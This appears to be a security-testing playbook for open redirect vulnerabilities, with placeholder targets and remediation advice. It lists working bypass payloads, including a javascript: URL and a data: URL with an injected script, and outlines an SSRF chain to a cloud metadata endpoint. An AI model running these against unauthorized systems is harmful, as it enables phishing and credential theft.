# Open Redirect Testing Playbook

## Overview
Open redirects enable phishing, token leakage, and SSRF chaining when a server-side
client follows redirects. This playbook covers discovery, bypass payloads, and
validation steps with evidence collection.

## Prerequisites
```bash
apt-get install -y jq
# Optional URL collectors
# go install github.com/lc/gau/v2/cmd/gau@latest
# go install github.com/tomnomnom/waybackurls@latest
```

## Phase 1: Discover Redirect Parameters
```bash
# Seed common parameter names
cat > /workspace/output/redirect_params.txt <<'PARAMS'
next
url
return
returnUrl
redirect
redirect_uri
continue
callback
success
PARAMS

# If you already have URL lists, extract candidates with parameters
rg -n "next=|url=|return=|redirect=|callback=" /workspace/output/urls.txt \
  > /workspace/output/TARGET_redirect_candidates.txt

# Optional: collect URLs from archives
# gau TARGET | rg -n "next=|url=|return=|redirect=|callback=" \
#   > /workspace/output/TARGET_redirect_candidates.txt
# waybackurls TARGET | rg -n "next=|url=|return=|redirect=|callback=" \
#   >> /workspace/output/TARGET_redirect_candidates.txt
```

## Phase 2: Baseline Payloads
```bash
cat > /workspace/output/TARGET_open_redirect_payloads.txt <<'PAYLOADS'
https://ATTACKER
//ATTACKER
/\\ATTACKER
\/\/ATTACKER
PAYLOADS
```

## Phase 3: Bypass Payloads
```bash
cat > /workspace/output/TARGET_open_redirect_bypass.txt <<'PAYLOADS'
# Scheme confusion
javascript:alert(1)
data:text/html,<script>location='https://ATTACKER'</script>

# Double encoding
%2F%2FATTACKER
%252F%252FATTACKER

# Unicode / punycode
https://evil。com
https://xn--evil-x63b.com

# Host confusion
https://victim.com@ATTACKER
https://ATTACKER/victim.com
https://victim.com.evil.com

# Whitelist bypass
https://WHITELISTED.com#@ATTACKER
https://WHITELISTED.com?next=https://ATTACKER
https://WHITELISTED.com/https://ATTACKER
PAYLOADS
```

## Phase 4: Validate Redirect Behavior
```bash
# Example test (replace parameter name)
curl -s -I "https://TARGET/login?next=https://ATTACKER" \
  | tee /workspace/output/TARGET_open_redirect_headers.txt

# Check status + Location header
rg -n "HTTP/|Location:" /workspace/output/TARGET_open_redirect_headers.txt \
  > /workspace/output/TARGET_open_redirect_evidence.txt
```

## Phase 5: SSRF Redirect Chain (Server-Side Follow)
```bash
# If the server fetches and follows redirects, chain to metadata
# Example attacker redirect endpoint
# https://ATTACKER/redirect?to=http://169.254.169.254/latest/meta-data/
```

## Report Template

```
Target: TARGET
Assessment Date: <DATE>

## Confirmed Findings
- [ ] Open redirect via <parameter>
- [ ] Bypass of allowlist/sanitization
- [ ] SSRF redirect chain possible

## Evidence
- Request/response: /workspace/output/TARGET_open_redirect_headers.txt
- Matched headers: /workspace/output/TARGET_open_redirect_evidence.txt

## Recommendations
1. Use allowlists with strict URL parsing
2. Block non-http(s) schemes and dangerous encodings
3. Re-validate after redirects (no open follow)
4. Avoid including tokens in redirect parameters
```

## Output Files
- `/workspace/output/TARGET_redirect_candidates.txt` — candidate URLs
- `/workspace/output/TARGET_open_redirect_payloads.txt` — baseline payloads
- `/workspace/output/TARGET_open_redirect_bypass.txt` — bypass payloads
- `/workspace/output/TARGET_open_redirect_headers.txt` — response headers
- `/workspace/output/TARGET_open_redirect_evidence.txt` — parsed evidence

indicators: open redirect url bypass redirect payload
